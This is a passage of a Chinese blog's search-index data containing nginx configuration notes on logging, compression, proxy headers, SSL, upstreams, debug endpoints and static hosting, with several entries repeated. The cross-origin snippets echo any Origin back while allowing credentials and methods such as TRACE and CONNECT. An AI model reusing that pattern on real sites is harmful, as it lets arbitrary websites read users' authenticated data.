10022; proxy_connect_timeout 30s; proxy_timeout 300s; proxy_pass service-a; } } http { include mime.types; default_type application/octet-stream; # 普通日志格式 log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" \"$http_user_agent\" ' '$request_length $request_time $upstream_addr ' '$upstream_response_length $upstream_response_time $upstream_status'; # json日志格式 log_format k-json escape=json '{ \"@timestamp\":\"$time_iso8601\", ' '\"@fields\":{ ' '\"request_uri\":\"$request_uri\", ' '\"url\":\"$uri\", ' '\"upstream_addr\":\"$upstream_addr\", ' '\"remote_addr\":\"$remote_addr\", ' '\"remote_user\":\"$remote_user\", ' '\"body_bytes_sent\":\"$body_bytes_sent\", ' '\"host\":\"$host\", ' '\"server_addr\":\"$server_addr\", ' '\"request_time\":\"$request_time\", ' '\"status\":\"$status\", ' '\"request\":\"$request\", ' '\"request_method\":\"$request_method\", ' '\"upstream_response_time\":\"$upstream_response_time\", ' '\"http_referrer\":\"$http_referer\", ' '\"http_x_forwarded_for\":\"$http_x_forwarded_for\", ' '\"http_user_agent\":\"$http_user_agent\" } }'; # 允许配置很多的server_name server_names_hash_max_size 1024; # 配置字符集 charset utf-8; # 访问日志 access_log /data/logs/nginx-access.log main; # 默认http 1.0, 改成1.1 proxy_http_version 1.1; # 内核完成文件发送,不需要read再write,没有上下文切换 sendfile on; # sendfile启用后才生效.累计一定大小后发送,减小额外开销,提高网络效率 tcp_nopush on; # 尽快发送数据,禁用Nagle算法(等凑满一个MSS-Maximum Segment Size最大报文长度或收到确认再发送) tcp_nodelay on; # 可以看到 TCP_NOPUSH 是要等数据包累积到一定大小才发送, TCP_NODELAY 是要尽快发送, 二者相互矛盾. # 实际上, 它们确实可以一起用.在传输文件的时候, 先填满包, 再尽快发送. 而其他的情况,都迅速发包,减少延迟. # 优先使用服务器支持的加密套件 ssl_prefer_server_ciphers on; # 加速性能 ssl_session_cache shared:SSL:10m; # 会话保持120秒 keepalive_timeout 120; types_hash_max_size 2048; server_tokens off; # 超时时间 proxy_connect_timeout 300; proxy_read_timeout 300; proxy_send_timeout 500; # 上传文件 client_max_body_size 2048M; # 大Header会导致502,解决 client_header_buffer_size 64k; # http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_buffer_size # 特殊的区域,一般存放的是header信息 proxy_buffer_size 256k; # 默认开启 proxy_buffering on; 只影响下面2个,不影响上面 # 缓冲区的个数和大小,ERR_INCOMPLETE_CHUNKED_ENCODING 加大这里 proxy_buffers 8 256k; # 在缓冲没有完全塞满的时候,需要划分一部分地方发送数据到客户端,这样可以加快响应. proxy_busy_buffers_size 512k; # 阿里云ingress # proxy_buffers: 4 256k # proxy-buffer-size: 256k # proxy-busy-buffers-size: 512k # 不把buffer外的内容写入到硬盘临时文件,但是会消耗比较多的内存 # 解决ERR_HTTP2_PROTOCOL_ERROR # proxy_max_temp_file_size 0; # header允许下划线 underscores_in_headers on; # 网络\u003e硬盘\u003e内存\u003ecpu,所以尽量减少网络占用. # 1k内不压缩,因为1个数据包差不多能发送完.压缩也需要时间. # 然后我们尽量压榨cpu. 如果能1个数据包发完,那么传输速度提升了. # 打开br压缩 brotli on; brotli_min_length 1k; brotli_comp_level 6; brotli_types application/atom+xml application/javascript application/json application/vnd.api+json application/rss+xml application/vnd.ms-fontobject application/x-font-opentype application/x-font-truetype application/x-font-ttf application/x-javascript application/xhtml+xml application/xml font/eot font/opentype font/otf font/truetype image/svg+xml image/vnd.microsoft.icon image/x-icon image/x-win-bitmap text/css text/javascript text/plain text/xml; # 打开gzip gzip on; gzip_min_length 1k; gzip_http_version 1.1; gzip_comp_level 7; # 压缩类型，下面的配置压缩了接口。可配置项参考nginx目录下的mime.types # 参考google压缩了html,css,js,json. text/html 总是会压缩,加上去返回而报错. # 图片属于压缩过了的格式, 应该由专门的服务或CDN转换图片格式 # text/javascript 用于兼容html5之前写的项目 gzip_types text/plain text/xml text/css text/javascript application/javascript application/json; gzip_vary on; gzip_disable \"msie6\"; # 等价 gzip_disable \"MSIE[1-6]\\.\" 但性能更好,匹配更合","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:2:1","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#nginxconf-主配置"},{"categories":["blog"],"content":" 通用 Header 配置/usr/local/nginx/conf/options/normal.conf # 关闭代表不修改upstream返回的Location,Refresh # 后端发送301,location地址可能会有问题,这时候需要开启 # proxy_redirect http:// https://; 把http改成https proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Forwarded-Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Real-Port $remote_port; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:2:2","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#通用-header-配置"},{"categories":["blog"],"content":" 长连接 websocket 配置/usr/local/nginx/conf/options/upgrade_to_websocket.conf proxy_http_version 1.1; proxy_set_header Host $host; proxy_set_header Upgrade $http_upgrade; # proxy_set_header Connection \"upgrade\"; # 配合map $http_upgrade $connection_upgrade使用 proxy_set_header Connection $connection_upgrade; ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:2:3","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#长连接-websocket-配置"},{"categories":["blog"],"content":" 证书配置/usr/local/nginx/conf/options/ssl_kentxxq.conf ssl_certificate /usr/local/nginx/conf/ssl/kentxxq.cer; ssl_certificate_key /usr/local/nginx/conf/ssl/kentxxq.key; ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:2:4","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#证书配置"},{"categories":["blog"],"content":" 时间转换在 server 内使用 /usr/local/nginx/conf/options/time.conf # nginx 内置变量，解析为定义格式，仅支持到秒 （实现支持到毫秒） # # $time_iso8601 日期格式示例： 2022-09-08T18:16:01+08:00 # $time_local 日期格式示例： 02/Aug/2022:11:11:32 +0800 # $msec 日期格式示例： 1663839717.105 当前的Unix时间戳,单位为秒，小数为毫秒 # 格式化日期 if ($time_iso8601 ~ \"^(\\d{4})-(\\d{2})-(\\d{2})T(\\d{2}):(\\d{2}):(\\d{2})(\\+\\d{2})\") { set $year $1; set $month $2; set $day $3; set $hour $4; set $minute $5; set $second $6; # 时区，只到小时 set $time_zone $7; # 自定义 yyyy-MM-dd hh:mi:ss 格式 set $time_zh \"$1-$2-$3 $4:$5:$6\"; } # 时间戳，单位毫秒 使用 $msec 去除中间的小数点实现 if ($msec ~ \"^(\\d+)\\.(\\d+)\") { set $timestamp $1$2; # 自定义 yyyy-MM-dd hh:mi:ss,SSS 带毫秒格式 set $time_zh_ms $time_zh,$2; # 自定义 yyyy-MM-dd hh:mi:ss.SSS 带毫秒格式 set $time_zh_ms2 $time_zh.$2; } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:2:5","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#时间转换"},{"categories":["blog"],"content":" map 配置/usr/local/nginx/conf/options/map.conf map $http_upgrade $connection_upgrade { default upgrade; '' close; } # $http_origin如果正则匹配了,$allow_origin会变成后面的值 map $http_origin $allow_origin { default \"\"; \"~http://www.kentxxq.com\" http://www.kentxxq.com; \"~https://www.kentxxq.com\" https://www.kentxxq.com; } # 添加map会影响性能,如果不是全局使用,建议采用include局部转换时间 # # 自定义 yyyy-MM-dd hh:mi:ss 格式 # map $time_iso8601 $time_zh { # default $time_iso8601; # \"~(\\d{4}-\\d{2}-\\d{2})T(\\d{2}:\\d{2}:\\d{2})(\\+\\d{2})\" \"$1 $2\"; # } # # # 时间戳，单位毫秒 使用 $msec 去除中间的小数点实现 # map $msec $timestamp { # default $msec; # ~(\\d+)\\.(\\d+) $1$2; # } # # # 自定义 yyyy-MM-dd hh:mi:ss,SSS 带毫秒格式 # map \"$time_iso8601 # $msec\" $time_zh_ms { # default $time_zh,000; # \"~(\\d{4}-\\d{2}-\\d{2})T(\\d{2}:\\d{2}:\\d{2})(\\+\\d{2}:\\d{2}) # (\\d+)\\.(\\d+)$\" \"$1 $2,$5\"; # } # # # 自定义 yyyy-MM-dd hh:mi:ss.SSS 带毫秒格式 # map \"$time_iso8601 # $msec\" $time_zh_ms2 { # default $time_zh.000; # \"~(\\d{4}-\\d{2}-\\d{2})T(\\d{2}:\\d{2}:\\d{2})(\\+\\d{2}:\\d{2}) # (\\d+)\\.(\\d+)$\" \"$1 $2.$5\"; # } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:2:6","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#map-配置"},{"categories":["blog"],"content":" 跨域配置文件 全部跨域/usr/local/nginx/conf/options/allow_all_cross_origin.conf # add_header 'Access-Control-Allow-Origin' * always; add_header 'Access-Control-Allow-Origin' $http_origin always; add_header 'Access-Control-Allow-Credentials' 'true'; add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS, HEAD, PUT, DELETE, TRACE, CONNECT'; # add_header 'Access-Control-Allow-Headers' 'Authorization,Content-Type'; add_header 'Access-Control-Allow-Headers' *; add_header 'Access-Control-Max-Age' 86400; 全部 options 跨域/usr/local/nginx/conf/options/allow_all_options_cross_origin.conf if ($request_method = 'OPTIONS') { # 前两条的配置为固定格式！兼容性最强。原因是客户端发送ajax请求，包含withCredentials的时候，origin不能为*，且Credentials必须为true。 # 原因 # 为了防止信息泄露的风险，需要Credentials为true。才能获取cookie等信息 # 如果origin为*，那么不安全。这是因为浏览器的同源策略。让浏览器内的js不能拿a网站的信息请求b站点 # 参考链接 # https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials # https://segmentfault.com/a/1190000015552557 # add_header 'Access-Control-Allow-Origin' $http_origin always; add_header 'Access-Control-Allow-Credentials' 'true'; add_header 'Access-Control-Allow-Methods' 'GET,POST,OPTIONS,HEAD,PUT,DELETE, TRACE, CONNECT'; add_header 'Access-Control-Allow-Headers' *; add_header 'Access-Control-Max-Age' 86400; add_header 'Content-Length' 0; return 204; } 特定匹配 options 跨域/usr/local/nginx/conf/options/allow_kentxxq_cross_origin.conf if ($request_method = 'OPTIONS') { add_header 'Access-Control-Allow-Origin' $allow_origin always; add_header 'Access-Control-Allow-Credentials' 'true'; add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS, HEAD, PUT, DELETE, TRACE, CONNECT'; add_header 'Access-Control-Allow-Headers' 'Authorization,Content-Type,Accept,Origin,User-Agent,DNT,Cache-Control,X-Mx-ReqToken,X-Requested-With,token,terminalType'; add_header 'Access-Control-Max-Age' 86400; add_header 'Content-Length' 0; return 204; } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:2:7","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#跨域配置文件"},{"categories":["blog"],"content":" 跨域配置文件 全部跨域/usr/local/nginx/conf/options/allow_all_cross_origin.conf # add_header 'Access-Control-Allow-Origin' * always; add_header 'Access-Control-Allow-Origin' $http_origin always; add_header 'Access-Control-Allow-Credentials' 'true'; add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS, HEAD, PUT, DELETE, TRACE, CONNECT'; # add_header 'Access-Control-Allow-Headers' 'Authorization,Content-Type'; add_header 'Access-Control-Allow-Headers' *; add_header 'Access-Control-Max-Age' 86400; 全部 options 跨域/usr/local/nginx/conf/options/allow_all_options_cross_origin.conf if ($request_method = 'OPTIONS') { # 前两条的配置为固定格式！兼容性最强。原因是客户端发送ajax请求，包含withCredentials的时候，origin不能为*，且Credentials必须为true。 # 原因 # 为了防止信息泄露的风险，需要Credentials为true。才能获取cookie等信息 # 如果origin为*，那么不安全。这是因为浏览器的同源策略。让浏览器内的js不能拿a网站的信息请求b站点 # 参考链接 # https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials # https://segmentfault.com/a/1190000015552557 # add_header 'Access-Control-Allow-Origin' $http_origin always; add_header 'Access-Control-Allow-Credentials' 'true'; add_header 'Access-Control-Allow-Methods' 'GET,POST,OPTIONS,HEAD,PUT,DELETE, TRACE, CONNECT'; add_header 'Access-Control-Allow-Headers' *; add_header 'Access-Control-Max-Age' 86400; add_header 'Content-Length' 0; return 204; } 特定匹配 options 跨域/usr/local/nginx/conf/options/allow_kentxxq_cross_origin.conf if ($request_method = 'OPTIONS') { add_header 'Access-Control-Allow-Origin' $allow_origin always; add_header 'Access-Control-Allow-Credentials' 'true'; add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS, HEAD, PUT, DELETE, TRACE, CONNECT'; add_header 'Access-Control-Allow-Headers' 'Authorization,Content-Type,Accept,Origin,User-Agent,DNT,Cache-Control,X-Mx-ReqToken,X-Requested-With,token,terminalType'; add_header 'Access-Control-Max-Age' 86400; add_header 'Content-Length' 0; return 204; } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:2:7","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#全部跨域"},{"categories":["blog"],"content":" 跨域配置文件 全部跨域/usr/local/nginx/conf/options/allow_all_cross_origin.conf # add_header 'Access-Control-Allow-Origin' * always; add_header 'Access-Control-Allow-Origin' $http_origin always; add_header 'Access-Control-Allow-Credentials' 'true'; add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS, HEAD, PUT, DELETE, TRACE, CONNECT'; # add_header 'Access-Control-Allow-Headers' 'Authorization,Content-Type'; add_header 'Access-Control-Allow-Headers' *; add_header 'Access-Control-Max-Age' 86400; 全部 options 跨域/usr/local/nginx/conf/options/allow_all_options_cross_origin.conf if ($request_method = 'OPTIONS') { # 前两条的配置为固定格式！兼容性最强。原因是客户端发送ajax请求，包含withCredentials的时候，origin不能为*，且Credentials必须为true。 # 原因 # 为了防止信息泄露的风险，需要Credentials为true。才能获取cookie等信息 # 如果origin为*，那么不安全。这是因为浏览器的同源策略。让浏览器内的js不能拿a网站的信息请求b站点 # 参考链接 # https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials # https://segmentfault.com/a/1190000015552557 # add_header 'Access-Control-Allow-Origin' $http_origin always; add_header 'Access-Control-Allow-Credentials' 'true'; add_header 'Access-Control-Allow-Methods' 'GET,POST,OPTIONS,HEAD,PUT,DELETE, TRACE, CONNECT'; add_header 'Access-Control-Allow-Headers' *; add_header 'Access-Control-Max-Age' 86400; add_header 'Content-Length' 0; return 204; } 特定匹配 options 跨域/usr/local/nginx/conf/options/allow_kentxxq_cross_origin.conf if ($request_method = 'OPTIONS') { add_header 'Access-Control-Allow-Origin' $allow_origin always; add_header 'Access-Control-Allow-Credentials' 'true'; add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS, HEAD, PUT, DELETE, TRACE, CONNECT'; add_header 'Access-Control-Allow-Headers' 'Authorization,Content-Type,Accept,Origin,User-Agent,DNT,Cache-Control,X-Mx-ReqToken,X-Requested-With,token,terminalType'; add_header 'Access-Control-Max-Age' 86400; add_header 'Content-Length' 0; return 204; } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:2:7","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#全部-options-跨域"},{"categories":["blog"],"content":" 跨域配置文件 全部跨域/usr/local/nginx/conf/options/allow_all_cross_origin.conf # add_header 'Access-Control-Allow-Origin' * always; add_header 'Access-Control-Allow-Origin' $http_origin always; add_header 'Access-Control-Allow-Credentials' 'true'; add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS, HEAD, PUT, DELETE, TRACE, CONNECT'; # add_header 'Access-Control-Allow-Headers' 'Authorization,Content-Type'; add_header 'Access-Control-Allow-Headers' *; add_header 'Access-Control-Max-Age' 86400; 全部 options 跨域/usr/local/nginx/conf/options/allow_all_options_cross_origin.conf if ($request_method = 'OPTIONS') { # 前两条的配置为固定格式！兼容性最强。原因是客户端发送ajax请求，包含withCredentials的时候，origin不能为*，且Credentials必须为true。 # 原因 # 为了防止信息泄露的风险，需要Credentials为true。才能获取cookie等信息 # 如果origin为*，那么不安全。这是因为浏览器的同源策略。让浏览器内的js不能拿a网站的信息请求b站点 # 参考链接 # https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials # https://segmentfault.com/a/1190000015552557 # add_header 'Access-Control-Allow-Origin' $http_origin always; add_header 'Access-Control-Allow-Credentials' 'true'; add_header 'Access-Control-Allow-Methods' 'GET,POST,OPTIONS,HEAD,PUT,DELETE, TRACE, CONNECT'; add_header 'Access-Control-Allow-Headers' *; add_header 'Access-Control-Max-Age' 86400; add_header 'Content-Length' 0; return 204; } 特定匹配 options 跨域/usr/local/nginx/conf/options/allow_kentxxq_cross_origin.conf if ($request_method = 'OPTIONS') { add_header 'Access-Control-Allow-Origin' $allow_origin always; add_header 'Access-Control-Allow-Credentials' 'true'; add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS, HEAD, PUT, DELETE, TRACE, CONNECT'; add_header 'Access-Control-Allow-Headers' 'Authorization,Content-Type,Accept,Origin,User-Agent,DNT,Cache-Control,X-Mx-ReqToken,X-Requested-With,token,terminalType'; add_header 'Access-Control-Max-Age' 86400; add_header 'Content-Length' 0; return 204; } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:2:7","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#特定匹配-options-跨域"},{"categories":["blog"],"content":" Upstream 配置 upstream backend { # 默认轮训,有weight就是加权轮训 # ip_hash; 适合session等固定机器场景 # least_conn; 最少连接数 server backend1.example.com max_fails=1 weight=10; server backend2.example.com max_fails=1 weight=5; server backend4.example.com; # 最大空闲连接数 keepalive 10; } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:2:8","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#upstream-配置"},{"categories":["blog"],"content":" 域名转发 转发配置/usr/local/nginx/conf/hosts/www.kentxxq.com.conf server { listen 80; server_name www.kentxxq.com; return 301 https://$server_name$request_uri; access_log /usr/local/nginx/conf/hosts/logs/www.kentxxq.com.log k-json; } server { http2 on; listen 443 ssl; server_name www.kentxxq.com; access_log /usr/local/nginx/conf/hosts/logs/www.kentxxq.com.log k-json; # 普通header头,ip之类的 include /usr/local/nginx/conf/options/normal.conf; # 跨域 include /usr/local/nginx/conf/options/allow_all_cross_origin.conf; # 证书相关 include /usr/local/nginx/conf/options/ssl_kentxxq.conf; location / { # 跨域 include /usr/local/nginx/conf/options/allow_all_options_cross_origin.conf; proxy_pass http://1.1.1.1:80; } } debug 配置/usr/local/nginx/conf/hosts/debug.conf server { listen 8000; access_log off; server_name _; include /usr/local/nginx/conf/options/time.conf; # 显示处理过,处理中的请求 # https://nginx.org/en/docs/http/ngx_http_stub_status_module.html location /status_string { stub_status; } location /status_metrics { default_type text/plain; return 200 '# TYPE connections_active counter # HELP The current number of active client connections including Waiting connections. connections_active $connections_active $timestamp # TYPE connections_reading counter # HELP The current number of connections where nginx is reading the request header. connections_reading $connections_reading $timestamp # TYPE connections_writing counter # HELP The current number of connections where nginx is writing the response back to the client. connections_writing $connections_writing $timestamp # TYPE connections_waiting counter # HELP The current number of idle client connections waiting for a request. connections_waiting $connections_waiting $timestamp'; } # 在header中展示各个时间 location /time { default_type text/plain; return 200 'time'; add_header time_zh $time_zh; add_header timestamp $timestamp; add_header time_msec $msec; add_header time_zh_ms $time_zh_ms; add_header time_zh_ms2 $time_zh_ms2; add_header time_local $time_local; add_header time_iso8601 $time_iso8601; } # tengine的debug模块,需要编译加入模块 # https://tengine.taobao.org/document_cn/ngx_debug_pool_cn.html # location = /debug_pool { # debug_pool; # } } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:2:9","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#域名转发"},{"categories":["blog"],"content":" 域名转发 转发配置/usr/local/nginx/conf/hosts/www.kentxxq.com.conf server { listen 80; server_name www.kentxxq.com; return 301 https://$server_name$request_uri; access_log /usr/local/nginx/conf/hosts/logs/www.kentxxq.com.log k-json; } server { http2 on; listen 443 ssl; server_name www.kentxxq.com; access_log /usr/local/nginx/conf/hosts/logs/www.kentxxq.com.log k-json; # 普通header头,ip之类的 include /usr/local/nginx/conf/options/normal.conf; # 跨域 include /usr/local/nginx/conf/options/allow_all_cross_origin.conf; # 证书相关 include /usr/local/nginx/conf/options/ssl_kentxxq.conf; location / { # 跨域 include /usr/local/nginx/conf/options/allow_all_options_cross_origin.conf; proxy_pass http://1.1.1.1:80; } } debug 配置/usr/local/nginx/conf/hosts/debug.conf server { listen 8000; access_log off; server_name _; include /usr/local/nginx/conf/options/time.conf; # 显示处理过,处理中的请求 # https://nginx.org/en/docs/http/ngx_http_stub_status_module.html location /status_string { stub_status; } location /status_metrics { default_type text/plain; return 200 '# TYPE connections_active counter # HELP The current number of active client connections including Waiting connections. connections_active $connections_active $timestamp # TYPE connections_reading counter # HELP The current number of connections where nginx is reading the request header. connections_reading $connections_reading $timestamp # TYPE connections_writing counter # HELP The current number of connections where nginx is writing the response back to the client. connections_writing $connections_writing $timestamp # TYPE connections_waiting counter # HELP The current number of idle client connections waiting for a request. connections_waiting $connections_waiting $timestamp'; } # 在header中展示各个时间 location /time { default_type text/plain; return 200 'time'; add_header time_zh $time_zh; add_header timestamp $timestamp; add_header time_msec $msec; add_header time_zh_ms $time_zh_ms; add_header time_zh_ms2 $time_zh_ms2; add_header time_local $time_local; add_header time_iso8601 $time_iso8601; } # tengine的debug模块,需要编译加入模块 # https://tengine.taobao.org/document_cn/ngx_debug_pool_cn.html # location = /debug_pool { # debug_pool; # } } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:2:9","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#转发配置"},{"categories":["blog"],"content":" 域名转发 转发配置/usr/local/nginx/conf/hosts/www.kentxxq.com.conf server { listen 80; server_name www.kentxxq.com; return 301 https://$server_name$request_uri; access_log /usr/local/nginx/conf/hosts/logs/www.kentxxq.com.log k-json; } server { http2 on; listen 443 ssl; server_name www.kentxxq.com; access_log /usr/local/nginx/conf/hosts/logs/www.kentxxq.com.log k-json; # 普通header头,ip之类的 include /usr/local/nginx/conf/options/normal.conf; # 跨域 include /usr/local/nginx/conf/options/allow_all_cross_origin.conf; # 证书相关 include /usr/local/nginx/conf/options/ssl_kentxxq.conf; location / { # 跨域 include /usr/local/nginx/conf/options/allow_all_options_cross_origin.conf; proxy_pass http://1.1.1.1:80; } } debug 配置/usr/local/nginx/conf/hosts/debug.conf server { listen 8000; access_log off; server_name _; include /usr/local/nginx/conf/options/time.conf; # 显示处理过,处理中的请求 # https://nginx.org/en/docs/http/ngx_http_stub_status_module.html location /status_string { stub_status; } location /status_metrics { default_type text/plain; return 200 '# TYPE connections_active counter # HELP The current number of active client connections including Waiting connections. connections_active $connections_active $timestamp # TYPE connections_reading counter # HELP The current number of connections where nginx is reading the request header. connections_reading $connections_reading $timestamp # TYPE connections_writing counter # HELP The current number of connections where nginx is writing the response back to the client. connections_writing $connections_writing $timestamp # TYPE connections_waiting counter # HELP The current number of idle client connections waiting for a request. connections_waiting $connections_waiting $timestamp'; } # 在header中展示各个时间 location /time { default_type text/plain; return 200 'time'; add_header time_zh $time_zh; add_header timestamp $timestamp; add_header time_msec $msec; add_header time_zh_ms $time_zh_ms; add_header time_zh_ms2 $time_zh_ms2; add_header time_local $time_local; add_header time_iso8601 $time_iso8601; } # tengine的debug模块,需要编译加入模块 # https://tengine.taobao.org/document_cn/ngx_debug_pool_cn.html # location = /debug_pool { # debug_pool; # } } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:2:9","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#debug-配置"},{"categories":["blog"],"content":" 静态页代理 简单版 location / { root /usr/share/nginx/html; index index.html; try_files $uri $uri/index.html /index.html; } 完整版本 server { listen 80; server_name www.kentxxq.com; return 301 https://$server_name$request_uri; access_log /usr/local/nginx/conf/hosts/logs/www.kentxxq.com.log; } server { http2 on; listen 443 ssl; server_name www.kentxxq.com; access_log /usr/local/nginx/conf/hosts/logs/www.kentxxq.com.log; include /usr/local/nginx/conf/options/normal.conf; include /usr/local/nginx/conf/options/ssl_kentxxq.conf; location / { if ($request_filename ~* .*\\.(?:htm|html)$) { add_header Cache-Control \"no-store\"; } root /usr/share/nginx/html; try_files $uri @index ; } location @index { add_header Cache-Control \"no-store\" ; root /usr/share/nginx/html; index index.html index.htm; try_files $uri/index.html /index.html; } error_page 405 =200 $uri; } 容器版本 server { listen 80; listen [::]:80; server_name localhost default_server; client_max_body_size 200m; location / { if ($request_filename ~* .*\\.(?:htm|html)$) { add_header Cache-Control \"no-store\"; } root /usr/share/nginx/html; try_files $uri @index ; } location @index { add_header Cache-Control \"no-store\" ; root /usr/share/nginx/html; index index.html index.htm; try_files $uri/index.html /index.html; } error_page 405 =200 $uri; } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:2:10","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#静态页代理"},{"categories":["blog"],"content":" 静态页代理 简单版 location / { root /usr/share/nginx/html; index index.html; try_files $uri $uri/index.html /index.html; } 完整版本 server { listen 80; server_name www.kentxxq.com; return 301 https://$server_name$request_uri; access_log /usr/local/nginx/conf/hosts/logs/www.kentxxq.com.log; } server { http2 on; listen 443 ssl; server_name www.kentxxq.com; access_log /usr/local/nginx/conf/hosts/logs/www.kentxxq.com.log; include /usr/local/nginx/conf/options/normal.conf; include /usr/local/nginx/conf/options/ssl_kentxxq.conf; location / { if ($request_filename ~* .*\\.(?:htm|html)$) { add_header Cache-Control \"no-store\"; } root /usr/share/nginx/html; try_files $uri @index ; } location @index { add_header Cache-Control \"no-store\" ; root /usr/share/nginx/html; index index.html index.htm; try_files $uri/index.html /index.html; } error_page 405 =200 $uri; } 容器版本 server { listen 80; listen [::]:80; server_name localhost default_server; client_max_body_size 200m; location / { if ($request_filename ~* .*\\.(?:htm|html)$) { add_header Cache-Control \"no-store\"; } root /usr/share/nginx/html; try_files $uri @index ; } location @index { add_header Cache-Control \"no-store\" ; root /usr/share/nginx/html; index index.html index.htm; try_files $uri/index.html /index.html; } error_page 405 =200 $uri; } ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:2:10","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#简单版"},{"categories":["blog"],"content":" 静态页代理 简单版 location / { root /usr/share/nginx/html; index index.html; try_files $uri $uri/index.html /index.html; } 完整版本 server { listen 80; server_name www.kentxxq.com; return 301 https://$server_name$request_uri; access_log /usr/local/nginx/conf/hosts/logs/www.kentxxq.com.log; } server { http2 on; listen 443 ssl; server_name www.kentxxq.com; access_log /usr/local/nginx/conf/hosts/logs/www.kentxxq.com.log; include /usr/local/nginx/conf/options/normal.conf; include /usr/local/nginx/conf/options/ssl_kentxxq.conf; location / { if ($request_filename ~* .*\\.(?:htm|html)$) { add_header Cache-Control \"no-store\"; } root /usr/share/nginx/html; try_files $uri @index ; } location @index { add_header Cache-Control \"no-store\" ; root /usr/share/nginx/html; index index.html index.htm; try_files $uri/index.html /index.html; } error_page 405 =200 $uri; } 容器版本 server { listen 80; listen [::]:80; server_name localhost default_server; client_max_body_size 200m; location / { if ($request_filename ~* .*\\.(?:htm|html)$) { add_header Cache-Control \"no-store\"; } root /usr/share/nginx/html; try_files $uri @index ; } location @index { add_header Cache-Control 